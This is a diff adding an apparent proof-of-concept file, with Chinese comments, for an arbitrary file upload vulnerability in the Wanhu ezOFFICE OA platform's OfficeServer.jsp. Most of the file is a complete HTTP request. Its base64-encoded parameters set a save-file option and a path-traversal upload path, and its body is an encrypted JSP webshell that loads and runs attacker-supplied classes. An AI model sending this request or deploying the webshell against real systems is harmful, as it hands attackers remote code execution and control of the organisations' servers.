@@ -1,0 +1,20 @@
+# 万户OA OfficeServerjsp任意文件上传漏洞
+# 万户Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行业。
+# 
+# 万户Ezoffice协同办公平台在 OfficeServer.jsp 除存在任意文件上传漏洞，导致攻击者可上传任意文件获取服务器权限
+POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp?acid=80000896&bid=hd_tag_m8mv24df HTTP/1.1
+Host: www.swaf.com
+Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66
+RM-PRO-BusinessID: hd_tag_m8mv24df
+RM-PRO-Token: 4a4bec1fd74784c0d71ceb0e59dc1be3
+RM-PRO-Time: 1742808375944
+User-Agent: curl/7.83.1
+
+DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
+OPTION=U0FWRUZJTEU=
+RECORDID=
+isDoc=dHJ1ZQ==
+moduleType=Z292ZG9jdW1lbnQ=
+FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
+111111111111111111111111111111111111111111111111
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
